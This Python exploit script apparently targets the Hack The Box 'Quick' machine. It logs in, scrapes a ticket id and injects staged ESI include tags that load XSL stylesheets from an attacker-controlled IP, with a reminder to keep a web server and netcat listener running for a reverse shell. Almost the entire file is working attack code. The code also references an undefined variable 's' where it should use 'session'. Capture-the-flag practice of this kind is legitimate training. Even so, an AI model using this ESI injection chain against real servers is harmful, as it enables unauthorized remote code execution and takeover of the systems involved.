#!/usr/bin/python3

import re
import requests
from time import sleep
from bs4 import BeautifulSoup as bs

session = requests.Session()

class QuickShell:

    def login(self, url, data):
        request = session.post(url, data=data)
        print('[+] Logged in and retrieving ticket')
        return

    def get_ticket(self, url) -> str:
        self.login(
            'http://quick.htb:9001/login.php', {
                'email': '<REDACTED>',
                'password': '<REDACTED>'
            }
        )
        request = session.get(url)
        content = request.content
        soup = bs(content, 'html.parser')
        ticket_location = soup.find_all('input')
        ticket_tag = ticket_location[2]
        ticket = re.findall(r'\d+', str(ticket_tag))
        ticket_str = ''.join(ticket)
        print(f'[+] Retrieved Ticket: {ticket_str}')
        return ticket_str

    def esi_injection(self, url, ip):
        print('\n[+] Injecting Payload')
        stages = ['stage1', 'stage2', 'stage3']
        headers = {'X-Requested-With': 'XMLHttpRequest'}
        msg = '<esi:include src="http://localhost:9001/index.php" stylesheet="http://' + ip + '/{}"></esi:include>'
        for stage in stages:
            if stage == stages[0]:
                data = {
                    'title': stages[0],
                    'msg': msg.format(stages[0] + '.xsl'),
                    'id': self.get_ticket(url)
                }
                inject = s.post(url, data=data)
                launch = s.get('http://quick.htb:9001/search.php?search=' + data['id'], headers=headers)
            elif stage == stages[1]:
                data = {
                    'title': stages[1],
                    'msg': msg.format(stages[1] + '.xsl'),
                    'id': self.get_ticket(url)
                }
                inject = s.post(url, data=data)
                launch = s.get('http://quick.htb:9001/search.php?search=' + data['id'], headers=headers)
            elif stage == stages[2]:
                data = {
                    'title': stages[2],
                    'msg': msg.format(stages[2] + '.xsl'),
                    'id': self.get_ticket(url)
                }
                inject = s.post(url, data=data)
                launch = s.get('http://quick.htb:9001/search.php?search=' + data['id'], headers=headers)
        return

def run():
    print('[!!] Make sure to have a python server and netcat listener up and running')
    for i in reversed(range(10)):
        sleep(1)
        print(f'\r[*] Launching exploit in: {str(i)}', end="", flush=False)
    # run exploit
    try:
        shell = QuickShell()
        shell.esi_injection('http://quick.htb:9001/ticket.php', '<IP ADDRESS>')
    except Exception as e:
        print(str(e))
        return False
    print('[++] DONE')

if __name__ == '__main__':
    run()